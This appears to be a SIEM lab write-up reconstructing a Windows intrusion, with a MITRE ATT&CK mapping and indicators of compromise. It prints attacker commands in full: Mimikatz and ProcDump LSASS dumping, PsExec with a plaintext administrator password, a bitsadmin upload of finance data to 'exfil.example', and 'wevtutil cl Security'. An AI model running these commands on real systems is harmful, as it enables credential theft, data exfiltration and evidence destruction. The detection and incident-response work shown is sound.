# 🔑 Investigation 15 – Credential Dumping, PsExec Lateral Movement & Finance Data Exfiltration

## 📌 Scenario

A compromised workstation (`WIN-WS01`) was used by an attacker to perform domain reconnaissance, steal credentials from the LSASS process, move laterally to a remote file server using stolen administrator credentials, collect sensitive finance documents, exfiltrate the data, and perform anti-forensics by deleting evidence and clearing Windows Security Event Logs.

---

# 🎯 Investigation Objectives

- Investigate credential dumping activity
- Analyze LSASS memory dumping
- Detect Mimikatz execution
- Investigate ProcDump abuse
- Analyze Domain Enumeration
- Detect PsExec lateral movement
- Investigate ADMIN$ share abuse
- Analyze remote service creation
- Investigate Finance server compromise
- Detect data staging and archive creation
- Analyze data exfiltration
- Investigate anti-forensics activity
- Map attacker behavior to MITRE ATT&CK

---

# 📊 Investigation Summary

| Category | Result |
|----------|--------|
| Total Events | **34** |
| Initial Host | **WIN-WS01** |
| Lateral Movement Target | **FILE-SRV01** |
| Primary User | **anil.patel** |
| Privileged Account | **administrator** |
| Attack Type | **Credential Dumping → Lateral Movement → Finance Data Exfiltration** |
| Incident Severity | 🔴 Critical |

---

# 📈 Event ID Analysis

| Event ID | Description | Count |
|----------|-------------|------:|
|4624|Successful Logon|4|
|4625|Failed Logon|1|
|4634|Logoff|1|
|4663|Object Access|2|
|4688|Process Creation|24|
|5156|Allowed Network Connection|1|
|7045|Service Installed|1|

---

# 📊 Severity Distribution

| Severity | Count |
|----------|------:|
|🔴 Critical|11|
|🟠 High|11|
|🟡 Medium|5|
|🟢 Low|7|

---

# 👤 Most Active Users

| User | Activity |
|------|----------|
| **anil.patel** | Initial compromised user |
| **administrator** | Used after credential theft for lateral movement |

---

# 🔍 Investigation Findings

---

## Phase 1 – Initial Compromise

The attacker gained execution on **WIN-WS01** and began reconnaissance using built-in Windows utilities.

### Commands Observed

```text
whoami /all
hostname
ipconfig /all
```

### Findings

The attacker identified:

- Logged-on user
- Hostname
- Network configuration
- Local system information

---

## Phase 2 – Domain Enumeration

### Commands

```cmd
net user /domain
net group "Domain Admins" /domain
nltest /dclist:corp.local
```

### Findings

The attacker enumerated:

- Domain users
- Members of the Domain Admins group
- Domain Controller information

This information was used to identify privileged accounts and prepare for lateral movement.

---

## Phase 3 – Credential Dumping

### Commands

```cmd
mimikatz.exe privilege::debug sekurlsa::logonpasswords
```

```cmd
procdump.exe -ma lsass.exe C:\Users\Public\lsass.dmp
```

### Findings

The attacker targeted the **LSASS** process to extract authentication material including NTLM hashes and other credentials.

A memory dump (`lsass.dmp`) was created for offline credential extraction.

---

## Phase 4 – Lateral Movement

### Command

```cmd
net use \\192.168.40.50\ADMIN$ /user:corp\administrator Passw0rd!
```

### Findings

The attacker authenticated to the hidden **ADMIN$ administrative share** using stolen administrator credentials.

---

## Phase 5 – Remote Code Execution

### Command

```cmd
psexec.exe \\192.168.40.50 -u corp\administrator -p Passw0rd! cmd.exe
```

### Findings

PsExec remotely executed commands on **FILE-SRV01**.

### Event ID 7045

A new Windows service (**PSEXESVC**) was installed, indicating successful remote execution.

---

## Phase 6 – Finance Server Discovery

### Commands

```cmd
dir C:\Shares\Finance
```

### Findings

The attacker enumerated sensitive finance files before beginning collection.

---

## Phase 7 – Data Collection

### Commands

```cmd
robocopy C:\Shares\Finance C:\Windows\Temp\finance_stage /E
```

### Findings

Finance documents were copied into a staging directory.

---

## Phase 8 – Archive Creation

### Command

```cmd
7z.exe a C:\Windows\Temp\finance_data.7z C:\Windows\Temp\finance_stage\*
```

### Findings

Collected finance files were compressed into a single archive for efficient exfiltration.

---

## Phase 9 – Data Exfiltration

### Command

```cmd
bitsadmin /transfer financeexfil /upload /priority normal C:\Windows\Temp\finance_data.7z http://exfil.example/upload
```

### Findings

The compressed archive was uploaded to attacker-controlled infrastructure using **BITSAdmin**.

---

## Phase 10 – Cleanup

### Commands

```cmd
cmd.exe /c del finance_data.7z
cmd.exe /c del lsass.dmp
```

### Findings

The attacker deleted both the credential dump and the archived finance data after successful exfiltration.

---

## Phase 11 – Anti-Forensics

### Command

```cmd
wevtutil cl Security
```

### Findings

Windows Security Event Logs were cleared on both compromised systems to remove evidence of attacker activity.

---

# 📈 Complete Attack Timeline

```text
Initial Compromise (WIN-WS01)
        │
PowerShell Execution
        │
System Reconnaissance
        │
Domain Enumeration
        │
Credential Dumping (LSASS)
        │
Administrator Credential Theft
        │
ADMIN$ Authentication
        │
PsExec Lateral Movement
        │
PSEXESVC Installed (7045)
        │
Remote Access to FILE-SRV01
        │
Finance File Discovery
        │
Finance Data Collection
        │
Archive Creation
        │
Data Exfiltration
        │
Delete Archive
        │
Delete LSASS Dump
        │
Clear Windows Security Logs
```

---

# 🎯 MITRE ATT&CK Mapping

| Technique | ID |
|------------|----|
| PowerShell | T1059.001 |
| Account Discovery | T1087 |
| Permission Groups Discovery | T1069 |
| Domain Controller Discovery | T1018 |
| OS Credential Dumping (LSASS) | T1003.001 |
| SMB/Windows Admin Shares | T1021.002 |
| Remote Service Session (PsExec) | T1563.002 |
| Service Execution | T1569.002 |
| File and Directory Discovery | T1083 |
| Data from Local System | T1005 |
| Local Data Staging | T1074.001 |
| Archive Collected Data | T1560.001 |
| Exfiltration Over Alternative Protocol | T1048 |
| File Deletion | T1070.004 |
| Clear Windows Event Logs | T1070.001 |

---

# 🚩 Indicators of Compromise (IOCs)

## Hosts

- WIN-WS01
- FILE-SRV01

## Users

- anil.patel
- administrator

## Suspicious Files

- lsass.dmp
- finance_data.7z
- Finance_Backup.xlsx

## Suspicious Processes

- mimikatz.exe
- procdump.exe
- psexec.exe
- bitsadmin.exe
- robocopy.exe
- 7z.exe
- wevtutil.exe

## Network Indicators

### Internal

- 192.168.40.21
- 192.168.40.50

### External

- 198.51.100.120

---

# 🚨 Incident Conclusion

The investigation revealed a successful post-exploitation attack where the attacker performed internal reconnaissance, dumped credentials from the LSASS process using **Mimikatz** and **ProcDump**, authenticated to a remote file server through the **ADMIN$** share, executed commands remotely using **PsExec**, collected and archived sensitive finance documents, exfiltrated the archive using **BITSAdmin**, and finally removed forensic evidence by deleting artifacts and clearing Windows Security Event Logs.

**Final Incident Severity:** 🔴 **Critical**

---

# 🛠️ Skills Demonstrated

- Splunk SIEM Investigation
- Threat Hunting
- Windows Event Log Analysis
- Credential Dumping Investigation
- LSASS Analysis
- Mimikatz Detection
- ProcDump Investigation
- Domain Enumeration Analysis
- PsExec Detection
- Lateral Movement Investigation
- Remote Service Detection
- Finance Data Exfiltration Analysis
- Incident Response
- IOC Identification
- MITRE ATT&CK Mapping
- Anti-Forensics Investigation

---

# ⭐ Investigation Status

✅ Completed

**Difficulty:** ⭐⭐⭐⭐⭐⭐ (Advanced Credential Theft & Lateral Movement)
